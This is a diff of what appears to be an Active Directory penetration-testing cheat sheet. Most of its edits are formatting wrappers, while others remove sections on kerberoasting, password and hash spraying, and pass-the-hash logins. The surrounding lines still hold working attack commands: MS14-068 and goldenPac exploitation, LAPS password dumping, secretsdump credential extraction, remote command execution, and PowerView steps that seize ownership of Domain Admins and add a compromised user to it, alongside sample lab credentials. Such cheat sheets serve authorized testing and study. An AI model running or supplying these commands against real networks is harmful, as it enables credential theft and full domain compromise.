@@ -492,32 +492,6 @@ python2 ./ms14-068.py -u user@domain.local -p SomePassword -d $ip -s SID
 impacket-goldenPac domain.local/SomeUser:SomePassword@dc.domain.local
 ```
 
-#### Validate users
-
-```
-kerbrute userenum users.txt -d example.com --dc 127.0.0.1
-```
-
-#### ASREPRoasting
-
-This will get a "ticket" meaning the users have the "UF\_DONT\_REQUIRE\_PREAUTH" set and will return a hash to crack
-
-{% code overflow="wrap" %}
-```
-python3 /usr/local/bin/GetNPUsers.py $domain/ -no-pass -usersfile users.txt -dc-ip $ip
-```
-{% endcode %}
-
-#### Kerberosting
-
-```
-python3 /usr/local/bin/GetUserSPNs.py example.com/user:password -dc-ip 127.0.0.1 -request
-```
-
-```
-Invoke-Kerberoast
-```
-
 ### RPC Bind
 
 #### Showmount
@@ -610,9 +584,11 @@ ldapsearch -v -x -b "DC=example,DC=com" -H "ldap://127.0.0.1" "(objectclass=*)"
 
 This will potentially retrieve local admin using windows password Local Administrator Password Solution (LAPS)
 
+{% code overflow="wrap" %}
 ```
 ldapsearch -x -H ldap://10.129.78.201 -D "SABatchJobs" -w SABatchJobs -b "dc=megabank,dc=local" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
 ```
+{% endcode %}
 
 Enumerate AD users. sometimes guest is enabled!
 
@@ -636,32 +612,16 @@ windapsearch --domain example.com --dc-ip 127.0.0.1 -u example\\user -p password
 crackmapexec ldap 127.0.0.1 -u guest -p "" --kdcHost 127.0.0.1
 ```
 
+{% code overflow="wrap" %}
 ```
 crackmapexec ldap 127.0.0.1 -u username -p /usr/share/wordlists/rockyou.txt --kdcHost 127.0.0.1
 ```
+{% endcode %}
 
 run windows command; if setting up revershell, use powershell and escape $ characters with \\
 
 ```
 crackmapexec smb 127.0.0.1 -u user -p password -x command
-```
-
-Hash dictionary attack
-
-```
-crackmapexec smb 127.0.0.1 -u users.txt -H NThashes.txt --continue-on-success
-```
-
-Hash spray
-
-```
-crackmapexec smb 127.0.0.1 -u users.txt -H :hash --continue-on-success --local-auth
-```
-
-Password dictionary attack
-
-```
-crackmapexec smb 127.0.0.1 -u users.txt -p passwords.txt --continue-on-success
 ```
 
 This will dump domain credentials and or kerberos tickets. can be used with rdp session
@@ -674,27 +634,17 @@ secretsdump.py domain.com/username:password@127.0.0.1
 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 ```
 
-This will give us command prompt if port 5985 is open and user is allowed WinRM using Passing The Hash technique
-
-```
-evil-winrm -i 127.0.0.1 -u username -H NTML_HASH
-```
-
-This will give us command prompt if port 5985 is open and user is allowed WinRM using normal username and password
-
-```
-evil-winrm -i 127.0.0.1 -u username -p password
-```
-
 With Valid Creds use to enumerate AD as user rerun after gaining more privileges
 
 ```
 . .\SharpHound.ps1;Invoke-BloodHound -CollectionMethod All
 ```
 
+{% code overflow="wrap" %}
 ```
 .\SharpHound.exe -c all --collectallproperties --ldapusername daisy.jordan --ldappassword Sprinkles1 -d bigturtleboys.local
 ```
+{% endcode %}
 
 Start Bloodhound
 
@@ -711,15 +661,11 @@ neo4j start
 
 Runs In Current Working Directory neo4j:neo4j
 
+{% code overflow="wrap" %}
 ```
 xhost + && sudo docker run -dt -v /tmp/.X11-unix/:/tmp/.X11-unix -v $(pwd):/root -e DISPLAY=$DISPLAY --network host --device /dev/dri/card0 --name bloodhound bannsec/bloodhound
 ```
-
-Get a deleted object/user properties that may include legacy password pwd base64
-
-```
-Get-ADObject -Filter {displayName -eq "TempAdmin"} -IncludeDeletedObjects -Properties *
-```
+{% endcode %}
 
 _Bypassing AMSI_
 
@@ -876,6 +822,7 @@ _GenericWrite_
 
 _use this for reverseshell using scriptpath=, enumeration, or use serviceprincipalname= for kerberoast_
 
+{% code overflow="wrap" %}
 ```
 $CompromisedUserName = 'CompromisedUserName'
 $CompromisedUserPass = ConvertTo-SecureString 'CompromisedUserPass' -AsPlainText -Force
@@ -885,9 +832,11 @@ Get-DomainSPNTicket -Credential $Cred LateralEscUserName | fl
 OR 
 Set-DomainObject -Credential $Cred -Identity LateralEscUserName -SET @{scriptpath='C:\\path\\to\\script.ps1'}
 ```
+{% endcode %}
 
 _WriteOwner_
 
+{% code overflow="wrap" %}
 ```
 $CompromisedUserName = 'CompromisedUserName'
 $CompromisedUserPass = ConvertTo-SecureString 'CompromisedUserPass' -AsPlainText -Force
@@ -897,6 +846,7 @@ Set-DomainObjectOwner -Credential $Cred -Identity "Domain Admins" -OwnerIdentity
 Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Domain Admins" -PrincipalIdentity CompromisedUser -Rights All
 Add-DomainGroupMember -Identity 'Domain Admins' -Members 'CompromisedUser' -Credential $Cred
 ```
+{% endcode %}
 
 _WriteOwner_ (For User)
 
